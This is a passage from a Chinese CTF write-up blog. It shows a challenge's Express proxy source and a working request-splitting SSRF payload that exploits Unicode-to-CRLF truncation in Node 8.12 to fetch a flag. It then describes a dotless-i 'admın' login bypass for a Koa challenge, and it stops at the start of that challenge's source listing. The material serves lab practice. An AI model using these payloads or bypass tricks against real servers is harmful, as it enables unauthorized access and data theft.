&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.dat&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/proxy/internal_website/:page&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">page&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 版本提示
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 先转小写再判断 不能有flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 白名单审查
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;available_endpoints&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">endpoints&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:5000/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#75715e">// 返回结果
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;The resource not found.&amp;#39;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Got error: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 返回报错原因
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 检查ip是否为本地
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unauthorized&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">contents&lt;/span> &lt;span style="color:#75715e">// 返回源码
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/:token&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">token&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 长度大于10回显ip
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public/temp/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 将flag写入public/temp/md5(ip+token)路径下 路径可控 但是访问本身受限 需要SSRF绕过
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>突破口在它使用的Node.js的版本恰好有上述SSRF的问题&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>入手点的代码代码就是这里了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png" alt="image-20211205210752342">&lt;/p>
&lt;p>现在就说想办法绕过白名单的审查并构造payload；我们需要第一个请求指向&lt;code>/proxy/internal_website/public_notes&lt;/code>，第二个请求指向&lt;code>/flag/amiz&lt;/code>，让flag存在&lt;code>public/temp/md5(127.0.0.1amiz)&lt;/code>路径下&lt;/p>
&lt;pre tabindex="0">&lt;code>public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
&lt;/code>&lt;/pre>&lt;h2 id="安洵杯-2019membershop">[安洵杯 2019]Membershop&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png" alt="image-20211206224942653">&lt;/p>
&lt;p>admin会被过滤，那就先简单登入&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png" alt="image-20211206225301864">&lt;/p>
&lt;p>抓包后通过session可以看出是koa框架&lt;/p>
&lt;p>这里出题人说很容易联想到后端使用&lt;code>toUpperCase()&lt;/code>的转换，用拉丁文越权登录&lt;code>admın&lt;/code>，之前也有一次做题用到这个点了，但是在这里没有想起来，我的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png" alt="image-20211206225648044">&lt;/p>
&lt;p>这下可以看源码了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-router&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
